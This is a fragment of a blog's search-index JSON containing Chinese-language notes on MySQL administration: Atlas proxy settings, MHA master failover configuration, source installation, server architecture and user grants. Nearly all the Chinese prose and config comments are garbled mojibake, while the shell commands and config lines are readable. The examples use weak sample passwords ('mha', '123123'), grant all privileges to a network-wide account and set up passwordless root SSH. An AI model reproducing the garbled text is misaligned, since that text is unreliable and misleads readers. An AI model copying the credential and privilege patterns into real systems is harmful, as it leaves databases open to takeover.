event-threads = 8 #æ—¥å¿—çº§åˆ«ï¼Œåˆ†ä¸ºmessageã€warningã€criticalã€errorã€debugäº”ä¸ªçº§åˆ« log-level = message #æ—¥å¿—å­˜æ”¾çš„è·¯å¾„ log-path = /usr/local/mysql-proxy/log #SQLæ—¥å¿—çš„å¼€å…³ï¼Œå¯è®¾ç½®ä¸ºOFFã€ONã€REALTIMEï¼ŒOFFä»£è¡¨ä¸è®°å½•SQLæ—¥å¿—ï¼ŒONä»£è¡¨è®°å½•SQLæ—¥å¿—ï¼ŒREALTIMEä»£è¡¨è®°å½•SQLæ—¥å¿—ä¸”å®æ—¶å†™å…¥ç£ç›˜ï¼Œé»˜è®¤ä¸ºOFF ## ç”¨äºè®°å½•å®æ—¶çš„sqlæ“ä½œæ—¥å¿—ï¼Œç”¨äºå®¡è®¡ #sql-log = OFF #æ…¢æ—¥å¿—è¾“å‡ºè®¾ç½®ã€‚å½“è®¾ç½®äº†è¯¥å‚æ•°æ—¶ï¼Œåˆ™æ—¥å¿—åªè¾“å‡ºæ‰§è¡Œæ—¶é—´è¶…è¿‡sql-log-slowï¼ˆå•ä½ï¼šms)çš„æ—¥å¿—è®°å½•ã€‚ä¸è®¾ç½®è¯¥å‚æ•°åˆ™è¾“å‡ºå…¨éƒ¨æ—¥å¿—ã€‚ #sql-log-slow = 10 #å®ä¾‹åç§°ï¼Œç”¨äºåŒä¸€å°æœºå™¨ä¸Šå¤šä¸ªAtlaså®ä¾‹é—´çš„åŒºåˆ† #instance = test # Atlasç›‘å¬çš„å·¥ä½œæ¥å£IPå’Œç«¯å£ proxy-address = 0.0.0.0:33060 # Atlasç›‘å¬çš„ç®¡ç†æ¥å£IPå’Œç«¯å£ ## ç”¨äºç®¡ç†atlasçš„ç«¯å£ admin-address = 0.0.0.0:2345 #åˆ†è¡¨è®¾ç½®ï¼Œæ­¤ä¾‹ä¸­personä¸ºåº“åï¼Œmtä¸ºè¡¨åï¼Œidä¸ºåˆ†è¡¨å­—æ®µï¼Œ3ä¸ºå­è¡¨æ•°é‡ï¼Œå¯è®¾ç½®å¤šé¡¹ï¼Œä»¥é€—å·åˆ†éš”ï¼Œè‹¥ä¸åˆ†è¡¨åˆ™ä¸éœ€è¦è®¾ç½®è¯¥é¡¹ #tables = person.mt.id.3 #é»˜è®¤å­—ç¬¦é›†ï¼Œè®¾ç½®è¯¥é¡¹åå®¢æˆ·ç«¯ä¸å†éœ€è¦æ‰§è¡ŒSET NAMESè¯­å¥ ## æ­¤é¡¹ä¸€å®šè¦å’Œæ•°æ®åº“å­—ç¬¦é›†ä¸€è‡´ #charset = utf8 #å…è®¸è¿æ¥Atlasçš„å®¢æˆ·ç«¯çš„IPï¼Œå¯ä»¥æ˜¯ç²¾ç¡®IPï¼Œä¹Ÿå¯ä»¥æ˜¯IPæ®µï¼Œä»¥é€—å·åˆ†éš”ï¼Œè‹¥ä¸è®¾ç½®è¯¥é¡¹åˆ™å…è®¸æ‰€æœ‰IPè¿æ¥ï¼Œå¦åˆ™åªå…è®¸åˆ—è¡¨ä¸­çš„IPè¿æ¥ #client-ips = 127.0.0.1, 192.168.1 #Atlaså‰é¢æŒ‚æ¥çš„LVSçš„ç‰©ç†ç½‘å¡çš„IP(æ³¨æ„ä¸æ˜¯è™šIP)ï¼Œè‹¥æœ‰LVSä¸”è®¾ç½®äº†client-ipsåˆ™æ­¤é¡¹å¿…é¡»è®¾ç½®ï¼Œå¦åˆ™å¯ä»¥ä¸è®¾ç½® #lvs-ips = 192.168.1.1 åŸºæœ¬ç®¡ç† ç™»é™† ","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysql Atlasé«˜å¯ç”¨è½¯ä»¶","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysql MHAé«˜å¯ç”¨è½¯ä»¶","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql MHAé«˜å¯ç”¨è½¯ä»¶","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"MHA(Master HA) é«˜å¯ç”¨è½¯ä»¶ è‡ªåŠ¨ä¸»ä»åˆ‡æ¢å·¥å…· https://github.com/yoshinorim/mha4mysql-manager https://github.com/yoshinorim/mha4mysql-node åŸºç¡€ç¯å¢ƒ ç¯å¢ƒå‡†å¤‡(1ç®¡ç†, 1ä¸»2ä»): manager: 172.16.10.10(10.0.2.10) master01: 172.16.10.25(10.0.2.25) slave01: 172.16.10.26(10.0.2.26) slave02: 172.16.10.27(10.0.2.27) å‡†å¤‡ å…³é—­æ‰€æœ‰èŠ‚ç‚¹relay_logè‡ªåŠ¨æ¸…ç†åŠŸèƒ½ # ä¸´æ—¶ sql\u003e set global relay_log_purge = 0; # æ°¸ä¹… $\u003e vim /etc/my.cnf relay_log_purge = 0 è®¾ç½®ä»åº“åªè¯»åŠŸ sql\u003e set global read_only=1 å„ä¸ªèŠ‚ç‚¹äº’è¿ $\u003e ssh-keygen $\u003e ssh-copy-id root@10.0.2.25 $\u003e ssh-copy-id root@10.0.2.26 $\u003e ssh-copy-id root@10.0.2.27 å®‰è£… ## æ‰€æœ‰èŠ‚ç‚¹å®‰è£…mha nodeè½¯ä»¶åŒ… # mha node è½¯ä»¶åŒ…ä¾èµ– $\u003e yum install perl-DBD-MySQL -y ## mha node è½¯ä»¶å®‰è£… $\u003e yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm ## ä¸»åº“æ·»åŠ MHAç®¡ç†ç”¨æˆ· $\u003e mysql -uroot -e \"grant all privileges on *.* to mha@'10.0.2.%' identified by 'mha';\" ## ç®¡ç†æœºå®‰è£…managerè½¯ä»¶(ç®¡ç†èŠ‚ç‚¹å®‰è£…ï¼Œå»ºè®®ç‹¬ç«‹ä¸€å°æˆ–éä¸»èŠ‚ç‚¹æœåŠ¡å™¨) # ä¾èµ–ç¯å¢ƒ $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y # mha manager è½¯ä»¶å®‰è£… $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y $\u003e yum install mha4mysql-manager-0.58-0.el7.centos.noarch.rpm -y # åˆ›å»ºé…ç½®æ–‡ä»¶ç›®å½• $\u003e mkdir /etc/mha $\u003e mkdir -p /var/log/mha/app1 $\u003e vim /etc/mha/app1.cnf [server default] # ç”¨äºç®¡ç†stop slave,change master,reset slaveç­‰æ“ä½œçš„è´¦å·ï¼Œç¼ºçœä¸ºroot user=mha password=mha # mha managerç”Ÿæˆçš„æ—¥å¿—æ®å¯¹è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œmha managerå°†æ‰“å°åœ¨æ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºä¸Š manager_log=/var/log/mha/app1/manager # mha managerç”Ÿæˆçš„ç›¸å…³çŠ¶æ€æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™é»˜è®¤ä½¿ç”¨/var/tmp manager_workdir=/var/log/mha/app1 # åœ¨masterä¸Šç”Ÿæˆbinlogçš„ç»å¯¹è·¯å¾„ master_binlog_dir=/data/mysqldb/binlog # è¿™ä¸ªå‚æ•°è¡¨ç¤ºmha managerå¤šä¹…pingï¼ˆæ‰§è¡Œselect ping sqlè¯­å¥ï¼‰ä¸€æ¬¡masterï¼Œè¿ç»­ä¸‰ä¸ªä¸¢å¤±pingè¿æ¥ï¼Œmha masterå°±åˆ¤å®šmateræ­»äº†ï¼Œå› æ­¤ï¼Œé€šè¿‡4æ¬¡pingé—´éš”çš„æœ€å¤§æ—¶é—´çš„æœºåˆ¶æ¥å‘ç°æ•…éšœï¼Œé»˜è®¤æ˜¯3ï¼Œè¡¨ç¤ºé—´éš”æ˜¯3ç§’ ping_interval=2 # repl_userå‚æ•°æŒ‡å®šçš„ç”¨æˆ·åå¯†ç  repl_user=repl repl_password=123123 # è®¿é—®MHA mangerå’ŒMHA mysqlèŠ‚ç‚¹çš„OSç³»ç»Ÿå¸å· ssh_user=root # \u003e https://www.cnblogs.com/xiaoboluo768/p/5973827.html # æ•…éšœæ—¶è‡ªåŠ¨è°ƒç”¨çš„è„šæœ¬ï¼Œä¸€èˆ¬ç”¨äºè‡ªåŠ¨vipæ¼‚ç§» master_ip_failover_script=/usr/local/bin/master_ip_failover # æ•…éšœæ—¶å‘é€æŠ¥å‘Šè°ƒç”¨çš„è„šæœ¬ # report_script= # èŠ‚ç‚¹ä¿¡æ¯é…ç½®ï¼Œä¸‹åˆ—é¡ºåºå°†å½±å“é€‰ä¸»çš„æƒé‡ï¼Œå·ç è¶Šå°æƒé‡è¶Šé«˜ [server1] hostname=10.0.2.25 port=3306 [server2] hostname=10.0.2.26 port=3306 [server3] hostname=10.0.2.27 port=3306 # binlogserveré…ç½®ï¼Œè¦æ±‚ä¸€å°é¢å¤–çš„æœºå™¨ï¼Œmysql 5.6ä»¥ä¸Šï¼Œæ”¯æŒgtidå¹¶å¼€å¯, å…¶ä½œç”¨æ˜¯ç”¨äºåŒæ­¥ä¸»åº“çš„binlogå†…å®¹ # å¿…é¡»å«è¿™ä¸ªåå­—binlog1ï¼Œæ˜¯MHAå®šä¹‰å¥½çš„ [binlog1] # æ°¸è¿œä¸ä¼šè¢«é€‰ä¸» no_master=1 hostname=10.0.2.27 port=3306 # éœ€è¦æ‰‹åŠ¨åˆ›å»ºè¿™ä¸ªç›®å½•ï¼Œå¹¶ç›®å½•ä¸èƒ½ä¸åŸç›®å½•ä¸€è‡´ master_binlog_dir=/data/mysqldb/binlog-server # çŠ¶æ€æ£€æŸ¥ ## äº’ä¿¡çŠ¶æ€æ£€æŸ¥ $\u003e masterha_check_ssh --conf=/etc/mha/app1.cnf ## ä¸»ä»çŠ¶æ€æ£€æŸ¥ $\u003e masterha_check_repl --conf=/etc/mha/app1.cnf # å¼€å¯MHA --remove_dead_master_conf è‡ªåŠ¨å°†æ•…éšœèŠ‚ç‚¹ä»é…ç½®æ–‡ä»¶ä¸­ç§»é™¤ --ignore_last_failover $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # æŸ¥çœ‹MHAçŠ¶æ€ $\u003e masterha_check_status --conf=/etc/mha/app1.cnf æ•…éšœæ¼”ç¤º ç›‘æ§MHA Manageræ—¥å¿—/var/log/mha/managerï¼Œæ‰‹åŠ¨å…³é—­mysqlä¸»åº“(10.0.2.25), æ—¥å¿—ä½“ç°ï¼Œå¼€å§‹æ£€æŸ¥ä¸»åº“çŠ¶æ€ï¼Œåœ¨æ¯éš”2ç§’æ£€æŸ¥å…±3æ¬¡åï¼Œç¬¬å››æ¬¡ä»ç„¶æ£€æŸ¥å¤±è´¥ï¼Œè‡ªåŠ¨åˆ‡æ¢ä¸»åº“ä¸ºç¬¬äºŒä¸ªèŠ‚ç‚¹(10.0.2.26-è‡ªåŠ¨è®¡ç®—), ä»é…ç½®æ–‡ä»¶ä¸­åˆ é™¤æ•…éšœèŠ‚ç‚¹é…ç½®ï¼Œå¹¶è‡ªåŠ¨å…³é—­MHA Managerç¨‹åºã€‚ æ•…éšœè§£å†³ æ¢å¤æ•…éšœä¸»èŠ‚ç‚¹ï¼Œå¹¶å°†æ•…éšœä¸»èŠ‚ç‚¹ä½œä¸ºä»èŠ‚ç‚¹é‡æ–°æ¢å¤(ç”Ÿäº§ç¯å¢ƒå»ºè®®ç›´æ¥é‡å»ºåŠ å…¥)åŠ å…¥åˆ°é›†ç¾¤å†…éƒ¨å»(åœ¨MHA Managerç®¡ç†æ—¥å¿—ä¸­,ä¼šåŒ…å«æ¢å¤æ—¶è¯¥æ‰§è¡Œçš„å‘½ä»¤change master xxxx), æ‰§è¡Œchange master xxxx(mhaæ—¥å¿—ä¸­æœ‰ä½“ç°)ï¼Œç„¶åstart salveï¼Œæœ€åæ‰‹åŠ¨æ·»åŠ æ•…éšœèŠ‚ç‚¹é…ç½®åˆ°mhaé…ç½®æ–‡ä»¶(/etc/mha/app1.cnf)ä¸­ï¼Œé‡æ–°å¯åŠ¨mhaç®¡ç† MHA binlongserver # 1. binlogserveré…ç½®ï¼Œè¦æ±‚ä¸€å°é¢å¤–çš„æœºå™¨ï¼Œmysql 5.6ä»¥ä¸Šï¼Œæ”¯æŒgtidå¹¶å¼€å¯, å…¶ä½œç”¨æ˜¯ç”¨äºåŒæ­¥ä¸»åº“çš„binlogå†…å®¹ $\u003e vim /etc/mha/app1.cnf # å¿…é¡»å«è¿™ä¸ªåå­—binlog1ï¼Œæ˜¯MHAå®šä¹‰å¥½çš„ [binlog1] # æ°¸è¿œä¸ä¼šè¢«é€‰ä¸» no_master=1 hostname=10.0.2.27 port=3306 # éœ€è¦æ‰‹åŠ¨åˆ›å»ºè¿™ä¸ªç›®å½•ï¼Œå¹¶ç›®å½•ä¸èƒ½ä¸åŸç›®å½•ä¸€è‡´ master_binlog_dir=/data/mysqldb/binlog-server # 2. é…ç½®èŠ‚ç‚¹åˆ›å»ºå¯¹åº”ç›®å½•(æƒé™) $\u003e mkdir -p /data/mysqldb/binlog-server # 3. æ‹‰å–ä¸»åº“çš„binlogæ—¥å¿—,å…ˆç¡®è®¤ä¸‹ä¸»åº“æ˜¯ä»å¤šå°‘å¼€å§‹çš„ show binary logs; éœ€å…¨éƒ¨æ‹‰å–ä¸‹æ¥ # binlogæ‹‰å–æœ¬èº«å’Œmhaæ²¡ä»€ä¹ˆå…³ç³»ï¼Œä½†éœ€è¦åœ¨mhaå¯åŠ¨æ˜¯å‰å¤„ç†å¥½ï¼Œå¦è¿™mhaå°†æ— æ³•æ­£å¸¸å¯åŠ¨ $\u003e cd /data/mysqldb/binlog-server \u0026\u0026 mysqlbinlog -R --host=10.0.2.26 --user=mha --password=mha --raw --stop-never mysql-bin.000001 \u0026 # 4. é‡å¯mha $\u003e masterha_stop --conf=/etc/mha/app1.cnf $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # 5. æ•…éšœæ¼”ç¤º # ä¸»åº“å®•æœºï¼Œbinlogserverè‡ªåŠ¨åœæ­¢ï¼Œmanagerä¹Ÿä¼šè‡ªåŠ¨åœæ­¢ # ä¸»åº“å®•æœºï¼Œbinlogserveræ—¥å¿—ä¹Ÿæ˜¯æ— æ•ˆäº†ï¼Œéœ€è¦é‡æ–°åŒæ­¥ # è§£å†³","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysql MHAé«˜å¯ç”¨è½¯ä»¶","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlå®‰è£…","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/","tags":["linux","mysql"],"title":"Mysqlå®‰è£…","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ç‰ˆæœ¬é€‰æ‹© é€‰æ‹©GAç‰ˆæœ¬ 6-12 ä¸ªæœˆçš„äº§å“(å¯¹äºå¼€å‘æ¥è¯´,å•æ•°ç‰ˆæœ¬ä¸€èˆ¬ä¸ºæµ‹è¯•ç‰ˆæœ¬) ç¼–è¯‘å®‰è£… yum install -y ncurses-devel libaio-devel cmake openssl-devel cmake . -DCMAKE_INSTALL_PREFIX=/opt/software/mysql-5.6.48 \\ -DMYSQL_DATADIR=/opt/software/mysql-server/data \\ -DMYSQL_UNIX_ADDR=/opt/software/mysql-server/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DWITH_EXTRA_CHARSETS=all \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPLE_STORAGE_ENGINE=1 \\ -DWITH_ZLIB=bundled \\ -DWITH_SSL=system \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_EMBEDDED_SERVER=1 \\ -DENABLE_DOWNLOADS=1 \\ -DWITH_DEBUG=0 åˆå§‹åŒ– åˆå§‹åŒ–æ•°æ®ç›®å½• ä»¥ä¸‹æ˜¯æ ¹æ®å¤šå®ä¾‹é…ç½®æ¥åˆå§‹åŒ–ä¸€äº›ä¿¡æ¯çš„,å¯æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹,å¦å¤–ç¨‹åºæ˜¯å®˜æ–¹çš„äºŒè¿›åˆ¶ç¨‹åº,å¦‚æœæ˜¯è‡ªå·±ç¼–è¯‘çš„,åœ¨æŒ‡å®šäº†é»˜è®¤å‚æ•°çš„æƒ…å†µä¸‹,ä¸‹åˆ—æè¿°çš„ä¸€äº›é—®é¢˜åº”è¯¥å¹¶ä¸å­˜åœ¨ # ç®€å•ç¤ºä¾‹ $\u003e mkdir /data/mysql56/3307/{data,logs,tmp} -p # æ³¨æ„ä¿®æ­£æƒé™ $\u003e cat /data/mysql56/3307/my.cnf # ç¤ºä¾‹é…ç½® [client] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysql] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysqld] port=3307 bind-address = 0.0.0.0 socket = /data/mysql56/3307/mysql.sock pid-file = /data/mysql56/3307/mysql.pid basedir = /opt/mysql56 datadir = /data/mysql56/3307/data tmpdir = /data/mysql56/3307/tmp log-error=/data/mysql56/3307/logs/mysqld.log skip-name-resolve 5.7 5.7å·²ç»æ²¡æœ‰mysql_install_dbåˆå§‹åŒ–è„šæœ¬,ç°é€šè¿‡mysqldè¿›è¡Œåˆå§‹åŒ–,å…¶ä»–é…ç½®å‚è€ƒ5.6çš„é…ç½®æ–¹æ¡ˆ https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.32-linux-glibc2.12-x86_64.tar.gz # å»ºè®®ä½¿ç”¨å®šåˆ¶çš„ my.cnf æ¥è¿›è¡Œåˆå§‹åŒ– # $\u003e /opt/mysql57/bin/mysqld --defaults-file=/data/mysql57/3307/etc/my.cnf --initialize-insecure --user=mysql $\u003e /opt/mysql57/bin/mysqld \\ --initialize-insecure \\ --user=mysql \\ --basedir=/opt/mysql57 \\ --datadir=/data/mysql57/3307/data 5.6 https://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.50-linux-glibc2.12-x86_64.tar.gz # å»ºè®®ä½¿ç”¨å®šåˆ¶çš„ my.cnf æ¥è¿›è¡Œåˆå§‹åŒ–(ä½¿ç”¨é…ç½®æ–‡ä»¶ä»ç„¶éœ€è¦æŒ‡å®šbasedirè·¯å¾„æˆ–è€…æ‰§è¡Œæ—¶åˆ‡æ¢åˆ°å®‰è£…ç›®å½•,ä»–çš„è¿™ä¸ªå€¼æ˜¯ä»å‘½ä»¤è¡Œè¯»å–çš„,æ²¡æœ‰è¯»å–åˆ°çš„è¯,basediré»˜è®¤ä¸º'.', mysql_install_db:426 è¡Œ ) $\u003e cd /opt/mysql56 \u0026\u0026 /opt/mysql56/scripts/mysql_install_db --defaults-file=/data/mysql56/3307/etc/my.cnf --user=mysql # $\u003e /opt/mysql56/scripts/mysql_install_db --user=mysql --basedir=/opt/mysql56 --datadir=/data/mysql56/3307/data å¯åŠ¨ç®¡ç† $\u003e /opt/mysql56/bin/mysqld_safe --defaults-file=/data/mysql56/3307/etc/my.cnf # åœ¨ç¨‹åºç›®å½•ä¸‹ support-files/mysql.server ä¸ºå®˜æ–¹çš„ç®¡ç†è„šæœ¬ï¼Œ å°†å…¶å¤åˆ¶åˆ°/etc/init.d/ä¸‹ï¼Œsystemdé‡è½½é…ç½®åä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹åº”åå­—çš„systemdç®¡ç†å•å…ƒ ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:0:0","tags":["linux","mysql"],"title":"Mysqlå®‰è£…","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlç¨‹åºæ¨¡å‹","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/","tags":["linux","mysql"],"title":"Mysqlç¨‹åºæ¨¡å‹(è‰ç¨¿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlç¨‹åºæ¨¡å‹ æŠ€å·§ mysqlç¨‹åºæ¨¡å‹ è¿æ¥å±‚ TCP/IPæˆ–Socketçš„è¿æ¥æ–¹å¼ éªŒè¯ç”¨æˆ·åå¯†ç  è¿æ¥çº¿ç¨‹: æ¥æ”¶sqlè¯­å¥,è¿”å›æ‰§è¡Œç»“æœ SQLå±‚: è¯­æ³•æ£€æŸ¥æ¨¡å—,æ£€æŸ¥ä¸Šå±‚å‘è¿‡æ¥çš„SQLæ˜¯å¦ç¬¦åˆè§„èŒƒ æƒé™æ£€æŸ¥æ¨¡å—.æ£€æŸ¥å½“å‰ç™»é™†ç”¨æˆ·æ˜¯å¦ç”±æƒé™æ“ä½œæ•°æ®åº“å¯¹è±¡ è¯­æ³•å®šä¹‰æ¨¡å—,è¯†åˆ«è¯­å¥ç§ç±» è§£æå™¨,è§£æå‡ºSQLè¯­å¥æ‰€æœ‰å¯èƒ½çš„æ‰§è¡Œæ–¹å¼,è¿™äº›æ–¹å¼è¢«ç§°ä¸º\"æ‰§è¡Œè®¡åˆ’\" ä¼˜åŒ–å™¨,åŸºäºæ‰§è¡Œä»£ä»·(åŸºäºç³»ç»Ÿèµ„æºçš„æ¶ˆè€—ä½œä¸ºç»´åº¦ \u003ccpu/mem/io\u003e),ç®¡ç†å‘˜å¯ä»¥é€šè¿‡é—´æ¥çš„æ–¹æ³•,å¹²é¢„ä¼˜åŒ–å™¨çš„é€‰æ‹©(ç´¢å¼•) æ‰§è¡Œå™¨,æŒ‰ç…§ä¼˜åŒ–å™¨é€‰æ‹©çš„\"æœ€ä¼˜\"çš„æ‰§è¡Œè®¡åˆ’æ‰§è¡ŒSQL,å¾—å‡ºç»“è®º: æŸæŸç£ç›˜çš„æŸæŸä½ç½® æŸ¥è¯¢ç¼“å­˜,ä¸€èˆ¬ä¼šç”¨redisç±»äº§å“æ›¿ä»£ è®°å½•æŸ¥è¯¢æ—¥å¿— å­˜å‚¨å¼•æ“å±‚ æ ¹æ®SQLå±‚çš„æ‰§è¡Œç»“æœ,å»ç£ç›˜æ‰¾åˆ°å¯¹åº”çš„æ•°æ®,ç»“æ„åŒ–ä¸ºè¡¨çš„æ¨¡å¼è¿”å›ç»™ç”¨æˆ· å’Œ\"ç£ç›˜(æ–‡ä»¶ç³»ç»Ÿ)â€œæ‰“äº¤é“çš„å±‚æ¬¡ é€»è¾‘ç»“æ„ æŠ½è±¡ç»“æ„ åº“(databases,schema) â€“ æ–‡ä»¶å¤¹ è¡¨(table) â€“ æ–‡ä»¶ ç‰©ç†ç»“æ„ â€¦ ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:0:0","tags":["linux","mysql"],"title":"Mysqlç¨‹åºæ¨¡å‹(è‰ç¨¿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Mysqlç®¡ç†","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysqlç®¡ç†","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ç”¨æˆ·ç®¡ç† -- æˆæƒè¯­æ³• mysql\u003e grant \u003cæƒé™\u003e on \u003cåº“å.è¡¨å\u003e to \u003cç”¨æˆ·å\u003e@'\u003cå¯è¿æ¥ä¸»æœº(å|ip)\u003e' identified by '\u003cå¯†ç \u003e'; -- æƒé™: SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,RELOAD,SHUTDOWN,PROCESS,FILE,REFERENCES,INDEX,ALTER,SHOW DATABASES,SUPER,CREATE TEMPORARY TABLES,LOCK TABLES,EXECUTE,REPLICATION SLAVE,REPLICATION CLIENT,CREATE VIEW,SHOW VIEW,CREATE ROUTINE,ALTER ROUTINE,CREATE USER,EVENT,TRIGGER,CREATE TABLESPACE -- ç”¨æˆ·åˆ›å»º mysql\u003e create user monitor@'10.0.2.2%' identified by 'Aa@@123456'; -- ç”¨æˆ·æˆæƒ: æˆæƒåç”¨æˆ·ä¹Ÿå¯ä»¥åˆ›å»ºæ•°æ®åº“,ä½†ä»…é™åˆ›å»ºæˆæƒäº†çš„åº“. mysql\u003e grant SELECT,INSERT,UPDATE,DELETE,CREATE,DROP on testdb.* to monitor@'10.0.2.26'; -- ç”¨æˆ·åˆ é™¤ mysql\u003e drop user root@'node26'; mysql\u003e drop user ''@'node26'; -- æŸ¥è¯¢ç”¨æˆ·æƒé™ mysql\u003e show grants for root@'localhost'; -- å–æ¶ˆæƒé™ mysql\u003e revoke create,drop on testdb.* from monitor@'10.0.2.26'; mysql\u003e revoke all on testdb.* from monitor@'10.0.2.26'; æ“ä½œæ–¹å¼ åˆ†ç±» DDL: æ•°æ®å®šä¹‰è¯­è¨€ alert åº“å®šä¹‰: åˆ›å»ºåº“å®šä¹‰ å¼€å‘è§„èŒƒ: åº“åä¸èƒ½å‡ºç°å¤§å†™(winå’ŒlinuxåŒºåˆ†å¤§å°å†™) åº“åä¸èƒ½ä»¥æ•°å­—å¼€å¤´ åº“åè¦å’Œæœ‰ä¸šåŠ¡åŠŸèƒ½ç›¸å…³ å»ºåº“è¦åŠ å­—ç¬¦é›† DCL: æ•°æ®æ§åˆ¶è¯­è¨€ grant/revoke DML: æ•°æ®æ“ä½œè¯­è¨€ insert/update/delete DQL: æ•°æ®æŸ¥è¯¢è¯­è¨€ select å¸®åŠ©å‘½ä»¤: mysql\u003e help create database å¸¸ç”¨çš„showè¯­å¥ -- æ˜¾ç¤ºæ‰€æœ‰æ•°æ®åº“ show databases; -- æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­çš„é»˜è®¤è¡¨ show tables; -- æ˜¾ç¤ºæŒ‡å®šæ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯ show tables from world; -- æ˜¾ç¤ºè¡¨åˆ—ç»“æ„ show columns from world.city; -- æ˜¾ç¤ºè¡¨ä¸­æœ‰å…³ç´¢å¼•å’Œç´¢å¼•åˆ—çš„ä¿¡æ¯ show index from world.city; -- æ˜¾ç¤ºå¯ç”¨å­—ç¬¦é›†å’Œé»˜è®¤æ ¡éªŒè§„åˆ™ show character set; -- æ˜¾ç¤ºå¯ç”¨æ ¡éªŒè§„åˆ™ show collation; -- æ˜¾ç¤ºæ•°æ®åº“çŠ¶æ€ show status; -- æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„å‚æ•°å®šä¹‰å€¼ show variables éäº¤äº’å¼ $\u003e mysql -u\u003cç”¨æˆ·å\u003e -p\u003cå¯†ç \u003e -e \"select user,host,password from mysql.user\" äº¤äº’å¼ - SQLç»“æ„åŒ–çš„æŸ¥è¯¢è¯­è¨€ $\u003e mysql -u\u003cç”¨æˆ·å\u003e -p\u003cå¯†ç \u003e mysql\u003e show databases; \\G: å°†æ•°æ®è½¬key-valueçš„å½¢å¼æ˜¾ç¤º,table_name:value,\\Gæ—¶ä¸èƒ½ä½¿ç”¨ ; ç»“ å°¾ mysql\u003e show databases\\G è®°å½•æ“ä½œæ—¥å¿—åˆ°æŸä¸ªæ–‡ä»¶(ç±»ä¼¼scriptå’Œscreenè®°å½•æ—¥å¿—çš„åŠŸèƒ½) mysql\u003e tee /tmp/test.log mysql\u003e show databases; ç»“æŸä¸Šä¸€æ¡å‘½ä»¤(æ­£å¸¸æƒ…å†µä¸‹mysql\u003e ä¸‹ä¸èƒ½ä½¿ç”¨ctrl+c) mysql\u003e sssss\\c æŸ¥çœ‹å½“å‰æ•°æ®åº“åŸºæœ¬çŠ¶æ€ mysql\u003e \\s # status æ‰§è¡Œå¤–éƒ¨sqlè„šæœ¬ mysql\u003e source \u003cfilename\u003e # \\. \u003cfilename\u003e åˆ‡æ¢åˆ°æŸä¸€ä¸ªæ•°æ®åº“ mysql\u003e use mysql # \\u mysql åˆ›å»ºæ•°æ®åº“ character set: å­—ç¬¦é›† collate: æ ¡éªŒè§„åˆ™ mysql\u003e create {database|schema} testdb02 default {charset|character set} utf8 collate utf8_bin; æŸ¥è¯¢å»ºåº“è¯­å¥ 